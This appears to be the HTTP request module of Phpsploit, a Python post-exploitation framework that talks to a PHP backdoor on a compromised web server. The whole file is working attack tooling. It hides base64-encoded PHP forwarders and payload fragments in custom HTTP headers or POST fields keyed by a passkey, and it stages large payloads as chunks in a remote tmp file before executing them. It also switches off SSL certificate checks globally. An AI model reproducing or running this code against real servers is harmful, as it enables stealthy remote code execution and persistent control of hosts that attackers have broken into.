"""Phpsploit HTTP request handler"""
__all__ = ["Request", "new_request", "get_raw_requests"]

import sys
import re
import math
import uuid
import time
import codecs
import base64
import zlib
import urllib.request
import urllib.parse
import http.client
import ssl

import core
from core import session
from datatypes import Path
import ui.input
from ui.color import colorize

from .exceptions import BuildError, RequestError, ResponseError
from . import payload

# don't verify ssl certificates, to support non-signed https TARGETs
if hasattr(ssl, "_create_unverified_context"):
    ssl._create_default_https_context = ssl._create_unverified_context

### Log raw http requests with custom HTTP Connection Handlers
_RAW_REQUESTS_LIST = []

class _CustomHTTPConnection(http.client.HTTPConnection):
    """Log raw http request into _RAW_REQUESTS_LIST globale
    """
    def send(self, data):
        global _RAW_REQUESTS_LIST
        # fixes: https://github.com/nil0x42/phpsploit/issues/65
        if data.startswith(b"GET /") or data.startswith(b"POST /"):
            _RAW_REQUESTS_LIST.append(data)
        elif _RAW_REQUESTS_LIST:
            _RAW_REQUESTS_LIST[-1] += data
        else:
            _RAW_REQUESTS_LIST.append(data)

        super().send(data)
http.client.__HTTPConnection__ = http.client.HTTPConnection
http.client.HTTPConnection = _CustomHTTPConnection

# TODO: intercept trafic on HTTPS requests too
# class _CustomHTTPSConnection(http.client.HTTPSConnection):
#     def send(self, s):
#         global global_raw_request
#         # fixes: https://github.com/nil0x42/phpsploit/issues/65
#         if data.startswith("GET ") or data.startswith("POST "):
#             _RAW_REQUESTS_LIST.append(data)
#         else:
#             _RAW_REQUESTS_LIST[-1] += data
#         super().send(s)
# http.client.__HTTPSConnection__ = http.client.HTTPSConnection
# http.client.HTTPSConnection = _CustomHTTPSConnection

# fixes https://github.com/nil0x42/phpsploit/issues/135
# but i don't know how ... :(
class _CustomHTTPHandler(urllib.request.HTTPHandler):
    pass
urllib.request.__HTTPHandler__ = urllib.request.HTTPHandler
urllib.request.HTTPHandler = _CustomHTTPHandler


def _load_template(filepath):
    """load a PHP tunnel data template file"""
    file = Path(core.BASEDIR, "data/tunnel", filepath, mode='fr')
    return file.phpcode()


class Request:
    """Phpsploit HTTP Request Handler
    """
    # the list of available methods
    methods = ['GET', 'POST']

    # pre-set headers, which might be considered to count vacant headers
    base_headers = ['host', 'accept-encoding', 'connection', 'user-agent']
    post_headers = ['content-type', 'content-length']

    # the parser format string, used to parse/unparse phpsploit data
    parser = '<%SEP%>%s</%SEP%>'


    # specific php code templates which are injected in the main evil
    # header, nominated by the PASSKEY setting, in charge of asessing
    # the main payload (in both POST and HEADER FILLING methods)
    forwarder_template = {'GET': _load_template('forwarders/get.php'),
                          'POST': _load_template('forwarders/post.php')}

    # on multipart payloads, these different php codes are used as a pipe
    # between header payload and final payload. the starter writes the
    # encoded first part of payload into the self.tmpfile, the sender
    # continues the operation appending middle parts into the tmpfile data;
    # finally, the reader writes the last part, then executes the tmpfile's
    # reassembled content.
    multipart = {'starter': _load_template('multipart/starter.php'),
                 'sender': _load_template('multipart/sender.php'),
                 'reader': _load_template('multipart/reader.php')}

    def __init__(self):
        # customizable variables
        self.target_obj = session.Conf.TARGET(call=False)
        self.hostname = self.target_obj.host
        self.port = self.target_obj.port
        self.target = self.target_obj()
        self.passkey = session.Conf.PASSKEY()
        self.is_first_payload = False
        self.is_first_request = True

        # default message exceptions on request/response fail
        self.errmsg_request = "Communication with the server impossible"
        self.errmsg_response = "Php runtime error"

        # eventual error produced on build_forwarder()
        self.payload_forwarder_error = None

        # Use the PROXY setting as urllib opener
        self.opener = session.Conf.PROXY()

        # the list of user specified additionnal headers (HTTP_* settings)
        self.set_headers = self.load_headers(session.Conf)

        # the parser/unparser are used to truncate phpsploit
        # data from the received http response.
        self.parser = self.parser.replace('%SEP%', str(uuid.uuid4()))
        self.unparser = re.compile((self.parser % '(.+?)').encode(), re.S)

        # try to get a tmpdir, which acts as recipient directory on payloads
        # sent via multiple requests, if no writeable tmpdir is known, the
        # user will be asked to manually determine a writeable directory
        # on the self.load_multipart() function.
        self.tmpfile = '/' + str(uuid.uuid4())
        if "WRITEABLE_TMPDIR" in session.Env.keys():
            self.tmpdir = session.Env["WRITEABLE_TMPDIR"] + self.tmpfile
        else:
            self.tmpdir = None

        # multipart_file is a small portion of php code in the form:
        # <? $f = "/tmp/dir" ?>, that indicates to multipart payloads
        # where the fragments of payload will be written.
        # the self.load_multipart() function sets it.
        self.multipart_file = None

        # the list of formated REQ_* Settings, for use in the http sender.
        hdr_payload = session.Conf.REQ_HEADER_PAYLOAD()
        hdr_payload = hdr_payload.replace('%%BASE64%%', '%s')
        self.header_payload = hdr_payload.rstrip(';') + ';'

        self.default_method = session.Conf.REQ_DEFAULT_METHOD()
        self.zlib_try_limit = session.Conf.REQ_ZLIB_TRY_LIMIT()
        self.max_post_size = session.Conf.REQ_MAX_POST_SIZE()
        self.max_header_size = session.Conf.REQ_MAX_HEADER_SIZE()
        self.max_headers = session.Conf.REQ_MAX_HEADERS()

        # determine how much header slots are really vacants, to calculate
        # what payload types will be available, and how much data can be
        # sent by http request.
        vacant_hdrs = (self.max_headers -
                       len(self.base_headers) -
                       len(self.set_headers.keys()) -
                       1)  # the payload forwarder header

        self.vacant_headers = {'GET': vacant_hdrs,
                               'POST': vacant_hdrs - len(self.post_headers)}

        # GET's max size gets -8 because payloaded headers are sent like this:
        #   `ZZAA: DATA\r\n`, aka 8 chars more than DATA.
        # POST's max size gets -5 because a POST data is sent like this:
        #   `PASSKEY=DATA\r\n\r\n`, so = and \r\n\r\n must be considered too.
        self.maxsize = {'GET':  vacant_hdrs * (self.max_header_size - 8),
                        'POST': self.max_post_size - len(self.passkey) - 5}

        # the self.can_send var is a dic of bools, 1 per available http method
        # which indicate if yes or no the concerned method can be really used.
        self.can_send = {'GET':  [self.maxsize['GET'] > 0],
                         'POST': False}
        if self.maxsize['POST'] > 0 and self.vacant_headers['POST'] >= 0:
            self.can_send['POST'] = True

    def other_method(self):
        """returns the inverse of the current default method"""

        if self.default_method == 'GET':
            return 'POST'
        return 'GET'

    def can_add_headers(self, headers):
        """check if the size of the specified headers list
        is in conformity with the max header size
        """
        headers = self.get_headers(headers)
        for name, value in headers.items():
            raw_header = '%s: %s\r\n' % (name, value)
            if len(raw_header) > self.max_header_size:
                return False
        return True

    def encapsulate(self, php_payload):
        """wrap unencoded payload within self.parser
        """
        php_payload = php_payload.rstrip(';')
        header, footer = [('echo "%s";' % x) for x in self.parser.split('%s')]
        return header + php_payload + footer

    def decapsulate(self, response):
        """extract payload response from http response body
        """
        response = response.read()
        match = re.findall(self.unparser, response)
        if match:
            return match[0]
        return response

    def load_multipart(self):
        """enable the multi-request payload capability.
        - ask user to determine a remote writeable directory if
          tunnel opener couldn't file one automatically.
        - choose appropriate multipart_file, which is a remote temporary file
          used to concatenate payload fragments before final execution.
        """
        ask_dir = ui.input.Expect(case_sensitive=False, append_choices=False)
        ask_dir.default = "/tmp"
        ask_dir.skip_interrupt = False
        ask_dir.question = ("Writeable remote directory needed"
                            " to send multipart payload ['/tmp/'] ")
        confirm = ui.input.Expect(True)
        confirm.skip_interrupt = False
        while not self.tmpdir:
            response = ask_dir()
            if confirm("Use '%s' as writeable directory ?" % response):
                self.tmpdir = response + self.tmpfile

        if not self.multipart_file:
            self.multipart_file = payload.py2php(self.tmpdir)
            self.multipart_file = "$f=%s;" % self.multipart_file
            multipart = dict()
            for name, phpval in self.multipart.items():
                multipart[name] = self.multipart_file + phpval
                if name in ['starter', 'sender']:
                    multipart[name] = self.encapsulate(multipart[name])
            self.multipart = multipart

    def build_forwarder(self, method, decoder):
        """build the effective payload forwarder, which is in fact
        a header using the PASSKEY setting as name.
        The payload forwarder is called by the remote backdoor, and then
        formats the final payload if necessary before executing it.

        """
        decoder = decoder % "$x"
        template = self.forwarder_template[method]
        template = template.replace('%%PASSKEY%%', self.passkey)

        raw_forwarder = template % decoder
        b64_forwarder = base64.b64encode(raw_forwarder.encode()).decode()
        # here we delete the ending "=" from base64 payload
        # because if the string is not enquoted it will not be
        # evaluated. on iis6, apache2, php>=4.4 it dont seem
        # to return error, and is a hacky solution to eval a payload
        # without quotes, preventing header quote escape by server
        # eg: "eval(base64_decode(89jjLKJnj))"
        b64_forwarder = b64_forwarder.rstrip('=')

        hdr_payload = self.header_payload
        forwarder = hdr_payload % b64_forwarder

        if not self.is_first_payload:
            # if the currently built request is not the first http query
            # sent to the server, it means that it works as it is. Therefore,
            # additionnal payload warnings and verifications are useless.
            return {self.passkey: forwarder}

        err = None
        # if the base64 payload is not enquoted by REQ_HEADER_PAYLOAD
        # setting and contains non alpha numeric chars (aka + or /),
        # then warn the user in case of bad http response.
        if "'%s'" not in hdr_payload and \
           '"%s"' not in hdr_payload and \
           not b64_forwarder.isalnum():
            # create a visible sample of the effective b64 payload
            len_third = float(len(forwarder) / 3)
            len_third = int(round(len_third + 0.5))
            sample_sep = colorize("%Reset", "\n[*]", "%Cyan")
            lines = [''] + self.split_len(forwarder, len_third)
            err = ("[*] do not enquotes the base64 payload which"
                   " contains non alpha numeric chars (+ or /),"
                   " blocking execution:" + sample_sep.join(lines))

        # if current request is not affected by previous case,
        # request may still fail because the header containing the
        # payload stager has quotes.
        elif '"' in hdr_payload or \
             "'" in hdr_payload:
            err = ("[*] contains quotes, and some http servers "
                   "defaultly act escaping them in request headers.")

        self.payload_forwarder_error = err
        return {self.passkey: forwarder}

    def build_get_headers(self, php_payload):
        """Split `php_payload` into a list of evil HTTP headers containing
        payload fractions.

        Original payload is recombined and executed at runtime by
        payload stager.

        Each header name is generated appending two alphabecital letters
        to the base name, in the form: ZZAA, ZZAB, ..., ZZBA, ZZBB, ZZBC, ...
        """
        # TODO: this function is horribly stupidly implemented
        def get_header_names(num):
            letters = 'abcdefghijklmnopqrstuvwxyz'
            result = []
            base = 0
            for x in range(num):
                x -= 26 * base
                try:
                    char = letters[x]
                except:
                    base += 1
                    char = letters[x-26]
                header_name = "zz" + letters[base] + char
                result.append(header_name)
            return result

        # considering that the default REQ_MAX_HEADERS and REQ_MAX_HEADER_SIZE
        # values can be greater than the real current server's capacity, the
        # following lines equilibrates the risks we take on both settings.
        # The -8 on the max_header_size keeps space for header name and \r\n
        data_len = len(php_payload)
        free_space_per_hdr = self.max_header_size - 8
        vacant_hdrs = self.vacant_headers['GET']

        sz_per_hdr = math.sqrt((data_len * free_space_per_hdr) / vacant_hdrs)
        sz_per_hdr = int(math.ceil(sz_per_hdr))

        hdr_datas = self.split_len(php_payload, sz_per_hdr)
        hdr_names = get_header_names(len(hdr_datas))
        return dict(zip(hdr_names, hdr_datas))

    def build_post_content(self, data):
        """returns a POST formated version of the given
        payload data with PASSKEY as variable name
        """
        post_data = urllib.parse.urlencode({self.passkey: data})
        post_data += "&" + session.Conf.REQ_POST_DATA()
        return post_data

    def build_single_request(self, method, php_payload):
        """build a single request from the given http method and
        payload, and return a request object.
        for infos about the return format, see the build_request() docstring.

        """
        # the header that acts as payload forwarder
        forwarder = self.build_forwarder(method, php_payload.decoder)

        headers = forwarder  # headers dictionnary
        content = None  # post data content, None on GET requests

        if not self.can_add_headers(headers):
            # if no more headers are available, the payload forwarder
            # can't be send, so we have to return an empty list
            return []
        if method == 'GET':
            # add built headers containing splitted main payload
            evil_headers = self.build_get_headers(php_payload.data)
            headers.update(evil_headers)
        if method == 'POST':
            # encode the main paylod as a POST data variable
            content = self.build_post_content(php_payload.data)

        return [(headers, content)]

    def build_multipart_request(self, method, php_payload):
        """build a multipart request for `php_payload` with HTTP `method`

        For infos about return format, read build_request() docstring.
        """
        compression = 'auto'
        if php_payload.length > self.zlib_try_limit:
            compression = 'nocompress'

        def encode(stager, php_payload):
            """wrap `php_payload` with `stager` and encode it"""
            data = stager.replace('DATA', php_payload).encode()
            return payload.Encode(data, compression)

        last_stager = self.multipart['reader'] % (php_payload.decoder % "$x")

        raw_data = php_payload.data
        base_num = self.maxsize[method]
        max_flaw = max(100, int(self.maxsize[method] / 100))

        built_reqs = []

        # loop while the payload has not been fully distributed into requests
        while True:
            # the multipart forwarder to use on currently built request
            forwarder = 'sender' if built_reqs else 'starter'
            forwarder = self.multipart[forwarder]

            req_done = False  # True when current req has been calculated
            php_payload = None  # the current request's payload string

            # the following loop is designed to determine the greatest
            # usable payload that can be used in a single request.
            # on these steps, min_range and max_range respectively represent
            # the current allowed size's range limits. while test_size
            # represent the currently checked payload size.
            test_size = base_num
            min_range = max_flaw
            max_range = 0
            while not req_done:
                if max_range > 0:
                    if max_range <= min_range:
                        max_range = min_range * 2
                    # set test_size to the current range's average
                    test_size = min_range + int((max_range - min_range) / 2)

                # try to build a payload containing the test_size data
                test_payload = encode(forwarder, raw_data[:test_size])

                # if it is too big, consider test_size as the new max_range
                # only if test_size if bigger than the max_flaw, else return err
                if test_payload.length > self.maxsize[method]:
                    if test_size <= max_flaw:
                        return []
                    max_range = test_size

                # if the payload is not too big
                else:
                    # then accept it as current request's payload size, only
                    # if the difference between current size and known limit
                    # does not exceeds the max_flaw. also accept it if this is
                    # the last built single request.
                    if test_size - min_range <= max_flaw \
                       or (built_reqs and test_size == base_num):
                        php_payload = test_payload
                        base_num = test_size
                        req_done = True
                    # we also now know that the max theorical size is bigger
                    # than tested size, so we settle min_range to it's value
                    min_range = test_size

            # our single request can now be added to the multi req list
            # and it's treated data removed from the full data set
            raw_data = raw_data[min_range:]
            request = self.build_single_request(method, php_payload)
            if not request:
                return []
            built_reqs += request

            # after each successful added request, try to put all remaining
            # data into a final request, and return full result if it enters.
            php_payload = encode(last_stager, raw_data)
            if php_payload.length <= self.maxsize[method]:
                request = self.build_single_request(method, php_payload)
                if not request:
                    return []
                built_reqs += request
                return built_reqs

    def build_request(self, mode, method, php_payload):
        """a frontend to the build_${mode}_request() functions.
        it takes request mode (single/multipart) as first argument, while
        the 2nd and 3rd are common request builder's arguments.

        * RETURN-FORMAT: the request builders return format is a list()
        containing one tuple per request. Each request tuple contains
        the headers dict() as first element, and the POST data as 2nd elem,
        which is a dict(), or None if there is no POST data to send.
        headers dict() is in the form: {'1stHdrName': '1stHdrValue', ...}
        * This is a basic request format:
            [  ( {"User-Agent":"firefox", {"Accept":"plain"}, None ),
               ( {"User-Agent":"ie"}, {"PostVarName":"PostDATA"} )    ]
        """
        builder_name = "build_%s_request" % mode
        if hasattr(self, builder_name):
            builder = getattr(self, builder_name)
            return builder(method, php_payload)
        return []

    def send_single_request(self, request):
        """send a single request object element (a request object's single
        tuple, in the form mentionned in the build_request() docstring.
        A response dict() will be returned, with 'error' and 'data' keys.

        """
        response = {'error': None, 'data': None}  # preset response values
        headers, content = request  # retrieve request elems from given tuple
        if isinstance(content, str):
            content = content.encode()

        # add the user settings specified headers, and get their real values.
        headers.update({"Host": self.hostname})
        headers.update(self.set_headers)
        headers = self.get_headers(headers)

        # erect the final request structure
        request = urllib.request.Request(self.target, content, headers)

        try:
            # send request with custom opener and decapsulate it's response
            resp = self.opener.open(request)
            response['data'] = self.decapsulate(resp)
            # if it works, then self.is_first_request bool() is no more True
            self.is_first_request = False

        # treat errors if request failed
        except urllib.error.HTTPError as e:
            try:
                response['data'] = self.decapsulate(e)
            except:
                response['data'] = None
            if response['data'] is None:
                response['error'] = str(e)
        except urllib.error.URLError as e:
            err = str(e)
            if err.startswith('<urlopen error '):
                err = err[15:-1]
                if err.startswith('[Errno '):
                    err = err[(err.find(']') + 2):]
                err = 'Request error: ' + err
            response['error'] = err
        except KeyboardInterrupt:
            response['error'] = 'HTTP Request interrupted'

        return response

    @staticmethod
    def get_php_errors(data):
        """function designed to parse php errors from phpsploit response
        for better output and plugin debugging purposes.
        Its is called by the Read() function and returns the $error string

        """
        error = ''
        data = data.replace(b'<br />', b'\n')  # html NewLines to Ascii
        # get a list of non-empty data lines
        lines = list()
        for line in data.split(b'\n'):
            line = line.strip()
            if line:
                lines.append(line)
        # extract errors from data
        for line in lines:
            try:
                line = line.decode()
            except:
                break
            # this condition basically considers current line as a php error
            if line.count(': ') > 1 and ' on line ' in line:
                line = re.sub(r' \[<a.*?a>\]', '', line)  # remove html link tag
                line = re.sub('<.*?>', '', line)  # remove other html tags
                line = line.replace(':  ', ': ')  # format double spaces
                line = ' in '.join(line.split(' in ')[0:-1])  # del line info
                error += 'PHP Error: %s\n' % line  # add erro line to return
        return error.strip()

    def read(self):
        """read the http response"""
        return self.response

    def open(self, php_payload):
        """open a request to the server with the given php payload
        It respectively calls the Build(), Send() and Read() methods.
        if one of these methods returns a string, it will be considered as
        an error, so execution will stop, and self.error will be filled.
        If no errors occur, then the self.response is filled, and the
        response may be obtained by the read() method.

        """

        # if the is more than one possible target, display the one used for
        # this request(s). Also print if connecting through `exploit` cmd
        if self.is_first_payload or len(session.Conf.TARGET.choices()) > 1:
            print("[*] Sending payload to %s ..." % self.target_obj)

        self.response = None
        self.response_error = None

        def display_warnings(obj):
            if type(obj).__name__ == 'str':
                for line in obj.splitlines():
                    if line:
                        print("\r[-] %s" % line)
                return True
            return False

        # this raises BuildError if it fails
        request = self.Build(php_payload)

        response = self.Send(request)
        if display_warnings(response):
            raise RequestError(self.errmsg_request)

        readed = self.Read(response)
        if display_warnings(readed):
            raise ResponseError(self.errmsg_response)

    def Build(self, php_payload):
        """Main request Builder:

        if takes the basic php payload as argument,
        and returns the apropriate request object.

        """
        # decline conflicting passkey strings
        if self.passkey.lower().replace('_', '-') in self.set_headers:
            raise BuildError('PASSKEY conflicts with an http header')

        # decline if an user set header do not match size limits
        if not self.can_add_headers(self.set_headers):
            raise BuildError('An http header is longer '
                             'than REQ_MAX_HEADER_SIZE')

        # format the current php payload whith the dedicated Build() method.
        php_payload = payload.Build(php_payload, self.parser)

        # get a dict of available modes by method
        mode = {}
        for m in self.methods:
            mode[m] = ''
            if self.can_send[m]:
                mode[m] = 'single'
                if php_payload.length > self.maxsize[m]:
                    mode[m] = 'multipart'

        # if REQ_DEFAULT_METHOD setting is enough for single mode, build now !
        if mode[self.default_method] == 'single':
            req = self.build_request('single',
                                     self.default_method,
                                     php_payload)
            if not req:
                raise BuildError('The forwarder is bigger '
                                 'than REQ_MAX_HEADER_SIZE')
            return req

        # load the multipart module if required
        if 'multipart' in mode.values():
            try:
                print('[*] Large payload: %s bytes' % php_payload.length)
                self.load_multipart()
            except KeyboardInterrupt:
                print('')
                raise BuildError('Payload construction aborted')

        # build both methods necessary requests
        request = dict()
        for m in self.methods:
            sys.stdout.write('\rBuilding %s method...\r' % m)
            sys.stdout.flush()
            request[m] = self.build_request(mode[m], m, php_payload)

        # if the default method can't be built, use the other as default
        if not request[self.default_method]:
            self.default_method = self.other_method()
        # but if even the other also cannot be built, then leave with error
        if not request[self.default_method]:
            raise BuildError('REQ_* settings are too small')

        # give user choice for what method to use
        self.choices = list()

        def choice(seq):
            """add arg to the choices list, and enlight it's output"""
            self.choices.append(seq[0].upper())
            hilightChar = colorize("%Bold", seq[0])
            output = '[%s]%s' % (hilightChar, seq[1:])
            return output

        # prepare user query for default method
        query = "%s %s request%s will be sent, you also can " \
                % (len(request[self.default_method]),
                   choice(self.default_method),
                   ['', 's'][len(request[self.default_method]) > 1])
        end = "%s" % choice('Abort')

        # add other method to user query if available
        if request[self.other_method()]:
            query += "send %s %s request%s or " \
                     % (len(request[self.other_method()]),
                        choice(self.other_method()),
                        ['', 's'][len(request[self.other_method()]) > 1])
        # or report that the other method has been disabled
        else:
            print('[-] %s method disabled:' % self.other_method() +
                  ' The REQ_* settings are too restrictive')

        query += end + ': '  # add the Abort choice
        self.choices.append(None)  # it makes sure the list length is >= 3

        # loop for user input choice:
        chosen = ''
        while not chosen:
            try:
                chosen = ui.input.Expect(None)(query).upper()
            except:
                print('')
                raise BuildError('Request construction aborted')
            # if no choice consider 1st choice
            if not chosen.strip():
                chosen = self.choices[0]
            # if 1st choice, use default method
            if chosen == self.choices[0]:
                return request[self.default_method]
            # if 3rd choice, use other method
            if chosen == self.choices[2]:
                return request[self.other_method()]
            # if 2nd choice, abort
            if chosen == self.choices[1]:
                raise BuildError('Request construction aborted')
            # else...
            else:
                raise BuildError('Invalid user choice')

    def Send(self, request):
        """Main request Sender:

        if takes the concerned request object as argument
        and returns the unparsed and decapsulated phpsploit response

        """
        # flush raw requests container
        global _RAW_REQUESTS_LIST
        _RAW_REQUESTS_LIST = []

        multiReqLst = request[:-1]
        lastRequest = request[-1]

        def updateStatus(curReqNum):
            curReqNum += 1  # don't belive the fact that humans count from 1 !
            numOfReqs = str(len(multiReqLst) + 1)
            curReqNum = str(curReqNum).zfill(len(numOfReqs))
            statusMsg = "Sending request %s of %s" % (curReqNum, numOfReqs)
            sys.stdout.write('\r[*] %s' % statusMsg)
            sys.stdout.flush()

        # considering that the multiReqLst can be empty, is means that the
        # following loop is only executer on multipart payloads.
        for curReqNum in range(len(multiReqLst)):
            interrupt_err = ('Send Error: Multipart transfer interrupted\n'
                             'The remote temporary payload «%s» must be '
                             'manually removed.' % self.tmpdir)
            sent = False
            while not sent:
                updateStatus(curReqNum)
                response = self.send_single_request(multiReqLst[curReqNum])
                error = response['error']
                # keyboard interrupt imediately leave with error
                if error == 'HTTP Request interrupted':
                    return interrupt_err
                # on multipart reqs, all except last MUST return the string 1
                if not error and response['data'] != b'1':
                    error = 'Execution error'

                # if the current request failed
                if error:
                    msg = " (Press Enter or wait 1 minut for the next try)"
                    sys.stdout.write(colorize("\n[-] ", error, "%White", msg))
                    waitkey = ui.input.Expect(None)
                    waitkey.timeout = 60
                    waitkey.skip_interrupt = False
                    try:
                        waitkey()
                    except (KeyboardInterrupt, EOFError):
                        return interrupt_err

                # if the request has been corretly executed, wait the
                # REQ_INTERVAL setting, and then go to the next request
                else:
                    try:
                        time.sleep(session.Conf.REQ_INTERVAL())
                    except:
                        return interrupt_err
                    sent = True

        # if it was a multipart payload, print status for last request
        if len(multiReqLst):
            updateStatus(len(multiReqLst))
            print('')

        # treat the last or single request
        response = self.send_single_request(lastRequest)
        if response['error']:
            return response['error']
        return response

    def Read(self, response):
        """Main request Reader

        if takes the http response data as argument
        and writes the __RESULT__'s php data into the self.response string,
        and writes the __ERROR__'s php error method to self.response_error.

        Note: The php __ERROR__ container is not a real error, but a
              phpsploit built method to allow plugins returning plugin
              error strings that can be differenciated from base result.

        """
        if response['data'] is None:
            # if no data and error, return it's string
            if response['error']:
                return response['error']
            # elif no data, nothing can be parsed
            print("[-] Server response coudn't be unparsed"
                  " (maybe invalid PASSKEY ?)")
            # print payload forwarder error (if any)
            if self.payload_forwarder_error:
                print("[*] If you are sure that the target is anyway "
                      "infected, this error may occur because the "
                      "REQ_HEADER_PAYLOAD\n" + self.payload_forwarder_error)
            return ''

        # anyway, some data has been received at this point
        b_response = response['data']
        assert isinstance(b_response, bytes)
        # try to decode it, optional because php encoding can be unset
        try:
            b_response = zlib.decompress(b_response)
        except zlib.error:
            pass
        assert isinstance(b_response, bytes)

        # convert the response data into python variable
        try:
            response = payload.php2py(b_response)
        except:
            php_errors = self.get_php_errors(response['data'])
            if php_errors:
                return php_errors
            raise

        # import pprint
        # pprint.pprint("------------- PYTHON RESPONSE DICT -------------")
        # pprint.pprint(response)

        # check that the received type is a dict
        if not isinstance(response, dict):
            raise ResponseError('Decoded response is not a dict()')
        # then check it is in the good format,
        # aka {'__RESULT__':'DATA'} OR {'__ERROR__': 'ERR'}
        if list(response.keys()) == ['__RESULT__']:
            self.response = response['__RESULT__']
        elif list(response.keys()) == ['__ERROR__']:
            self.response_error = response['__ERROR__']
        else:
            raise ResponseError('Returned dict() is in a wrong format')

    @staticmethod
    def split_len(string, length):
        """split `string` into a list of items whose size
        does not exceed `length`

        >>> split_len('phpsploit', 2)
        ['ph', 'ps', 'pl', 'oi', 't']
        """
        result = []
        for pos in range(0, len(string), length):
            end = pos + length
            result.append(string[pos:end])
        return result

    @staticmethod
    def load_headers(settings):
        """Load the list of user defined headers ('HTTP_*' settings)

        This function retrieves settings *LineBuffer objects.
        To pick settings's *usable-value, get_headers() shall be used.
        """
        headers = {"user-agent": ""}
        for key, val in settings.items():
            if key.startswith('HTTP_') and key[5:]:
                key = key[5:].lower().replace('_', '-')
                headers[key] = val
        return headers

    @staticmethod
    def get_headers(headers):
        """get *usable-value of user-defined http headers.

        This function must be called just before each individual
        request, to correctly access *usable-value of LineBuffer
        objects (configuration settings)
        """
        result = {}
        for key, val in headers.items():
            key = key.lower().replace("_", "-")
            if callable(val):
                val = val()
            result[key] = val
        return result


def new_request():
    """Wrapper for Request() method which returns
    backwards compatibility handler if needed.

    """
    from . import compat_handler
    if "id" in session.Compat and session.Compat["id"] == "v1":
        request = compat_handler.Request_V1_x()
        request.passkey = session.Compat["passkey"]
    else:
        request = Request()
    return request


def get_raw_requests():
    """retrieve raw requests from previously sent payload"""
    return _RAW_REQUESTS_LIST
